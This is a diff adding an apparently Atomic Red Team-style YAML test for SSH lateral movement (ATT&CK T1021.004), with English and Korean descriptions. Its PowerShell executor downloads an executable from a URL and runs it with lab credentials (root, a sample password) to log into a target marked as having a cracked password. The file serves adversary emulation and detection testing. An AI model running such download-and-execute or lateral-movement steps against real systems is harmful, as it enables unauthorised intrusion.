@@ -1,0 +1,89 @@
+attack_technique: T1021.004
+display_name: 'Remote Services: SSH'
+category:
+    - Lateral Movement
+progress: Complete
+atomic_tests:
+    - name: 'Remote Services: SSH Client'
+      description: |
+        English : SSH server connection
+
+        Korean:
+        SSH 서버에 연결하는 기법
+        
+         - Execute : SSH 실행
+         - Pre : 필요 없음
+         - Input : user, pass, ssh server ip, ssh server port, ssh 다운로드 url, ssh 프로그램 다운로드 경로
+         - Dependency : 필요 없음
+         - Output : ssh 연걸 정보
+         - Post : ssh 연결 정보 존재
+
+      supported_platforms:
+        - windows
+      pre:
+        prepare_executor_name: ""
+        command: ""
+      input_arguments:
+        user:
+            description: ssh user name
+            type: String
+            default: root
+        pass:
+            description: ssh user pass
+            type: String
+            default: trainee!@
+        sshServerIp:
+            description: ssh Server IP
+            type: Ip
+            default: 192.168.103.17
+        sshServerPort:
+            description: ssh Server Port
+            type: integer
+            default: 22
+        sshurl:
+            description: python script url
+            type: Url
+            default: 'http://127.0.0.1:8080/T1021.004/T1021.004@2_ssh.exe'
+        ssh_file:
+            description: Path where results will be placed
+            type: Path
+            default: '$env:Temp\T1021.004\T1021.004@2_ssh.exe'
+      dependency_executor_name: ""
+      dependencies: []
+      executor:
+        name: powershell
+        command: |
+            New-Item -ItemType Directory (Split-Path #{ssh_file}) -Force | Out-Null
+            $WebRequest=New-Object System.Net.WebClient
+            $WebRequest.UseDefaultCredentials=$true
+            #$WebRequest.Credentials=(Get-Credential)
+            $Data=$WebRequest.DownloadData("#{sshurl}")
+            [System.IO.File]::WriteAllBytes("#{ssh_file}",$Data)
+            .#{ssh_file} -i #{sshServerIp} -p #{sshServerPort} -u #{user} -c #{pass}
+      output:
+        output_executor_name: powershell
+        command: |
+            .#{ssh_file} -i #{sshServerIp} -p #{sshServerPort} -u #{user} -c #{pass}
+      post:
+        post_executor_name: powershell
+        command: |
+            $result = (.#{ssh_file} -i #{sshServerIp} -p #{sshServerPort} -u #{user} -c #{pass})
+            if( $result -contains '#{user}') { exit 0 } else { exit 1 }
+      technique_remote: True
+      source:
+        pre_state: 
+          - Compromised : True
+          - OS_type : Windows
+          - OS_status : Running
+      dest:
+        pre_state:
+          - Compromised : False
+          - Reachable : True
+          - Discovered : True
+          - SSH : True
+          - SSH_s : Running
+          - Password : True
+          - Password_s : Cracked
+        post_state:
+          - Privilege : User
+          - Compromised : True
